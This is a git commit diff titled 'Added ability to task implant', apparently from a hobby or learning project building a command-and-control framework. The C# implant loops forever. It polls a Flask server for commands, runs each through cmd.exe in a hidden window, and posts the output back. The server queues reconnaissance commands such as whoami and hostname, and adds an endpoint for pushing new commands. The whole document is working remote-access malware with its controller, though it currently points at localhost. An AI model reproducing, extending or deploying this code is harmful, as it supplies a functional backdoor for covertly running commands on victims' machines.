c094fbe36a0818d73b04b4bc2bfe70957ed2db21
reyals <reyals@glowingninja.ninja>
2022-09-25 14:23:12 -0400

    Added ability to task implant

--- Program.cs
+++ Program.cs
@@ -1,21 +1,27 @@
 ﻿using System.Diagnostics;
 string responseBody;
-
+int sleep = 2000;
 HttpClient client = new HttpClient();
-HttpResponseMessage response = await client.GetAsync("http://127.0.0.1:5000/checkin");
-//response.EnsureSuccessStatusCode();
-responseBody = await response.Content.ReadAsStringAsync();
-Console.WriteLine(responseBody);
+while (true) {
+    Thread.Sleep(sleep);
+    HttpResponseMessage response = await client.GetAsync("http://127.0.0.1:5000/checkin");
+    if (response.StatusCode != System.Net.HttpStatusCode.OK) {
+        continue;
+    }
+    //response.EnsureSuccessStatusCode();
+    responseBody = await response.Content.ReadAsStringAsync();
+    Console.WriteLine(responseBody);
 
-Process start = new Process();
-start.StartInfo.FileName = "c:\\windows\\system32\\cmd.exe";
-start.StartInfo.Arguments = "/c " + responseBody;
-start.StartInfo.UseShellExecute = false;
-start.StartInfo.CreateNoWindow = true;
-start.StartInfo.RedirectStandardOutput = true;
-start.Start();
-string data = start.StandardOutput.ReadToEnd();
-StringContent postdata = new StringContent(data);
-response = await client.PostAsync("http://127.0.0.1:5000/response", postdata);
-responseBody = await response.Content.ReadAsStringAsync();
-Console.WriteLine(responseBody);
+    Process start = new Process();
+    start.StartInfo.FileName = "c:\\windows\\system32\\cmd.exe";
+    start.StartInfo.Arguments = "/c " + responseBody;
+    start.StartInfo.UseShellExecute = false;
+    start.StartInfo.CreateNoWindow = true;
+    start.StartInfo.RedirectStandardOutput = true;
+    start.Start();
+    string data = start.StandardOutput.ReadToEnd();
+    StringContent postdata = new StringContent(data);
+    response = await client.PostAsync("http://127.0.0.1:5000/response", postdata);
+    responseBody = await response.Content.ReadAsStringAsync();
+    Console.WriteLine(responseBody);
+}
--- server.py
+++ server.py
@@ -1,14 +1,26 @@
-from flask import Flask, request
+from flask import Flask, request, abort
+import queue
 
 app = Flask(__name__)
+outgoingcommands = queue.Queue()
+for cmd in ["whoami", "cd", "hostname"]:
+    outgoingcommands.put(cmd)
 
 @app.route("/checkin", methods = ['GET'])
 def checkin():
-    return "whoami"
+    try:
+        return outgoingcommands.get_nowait()
+    except:
+        abort(404)
 
 @app.route("/response", methods = ['POST'])
 def response():
     print(request.data)
+    return "ok"
+
+@app.route("/addcmd", methods = ["POST"])
+def addcmd():
+    outgoingcommands.put(request.data)
     return "ok"
 
 
